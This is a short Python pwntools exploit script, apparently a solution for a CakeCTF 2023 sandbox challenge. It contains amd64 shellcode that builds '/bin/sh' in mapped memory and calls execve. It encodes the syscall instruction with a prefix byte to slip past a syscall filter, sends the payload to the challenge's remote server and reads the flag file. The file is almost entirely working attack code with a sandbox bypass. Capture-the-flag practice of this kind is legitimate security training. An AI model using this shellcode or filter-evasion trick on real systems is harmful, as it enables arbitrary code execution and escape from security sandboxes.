#!/usr/bin/env python3

from pwn import *

context.log_level = logging.DEBUG

shellcode = """
    /* mmap rw memory*/
    mov edi, 0x10000
    mov esi, 4096
    mov rdx, 3
    mov r10, 0x22
    xor r8, r8
    xor r9, r9
    mov rax, 9
    syscall
    mov r10, rax
    
    /* write /bin/sh */
    mov rsi, 0x6e69622f
    mov rdi, 0x1001
    mov rax, 158
    syscall    
    mov rsi, r10
    mov rdi, 0x1004
    mov rax, 158
    syscall

    mov rsi, 0x68732f
    mov rdi, 0x1001
    mov rax, 158
    syscall    
    mov rsi, r10
    add rsi, 4
    mov rdi, 0x1004
    mov rax, 158
    syscall   

    /* call execve('/bin/sh', NULL, NULL) */
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, r10
    mov rax, 59
    syscall
"""


shellcode = shellcode.replace('syscall', '.byte 0x66, 0x0F, 0x05')

s = asm(shellcode, arch='amd64', bits=64)

# p = process('./sandbox.py')
p = remote('others.2023.cakectf.com', 10001)
p.sendlineafter('shellcode: ', s.hex())
p.sendline('cat /flag*')
info(p.recvline())
p.close()
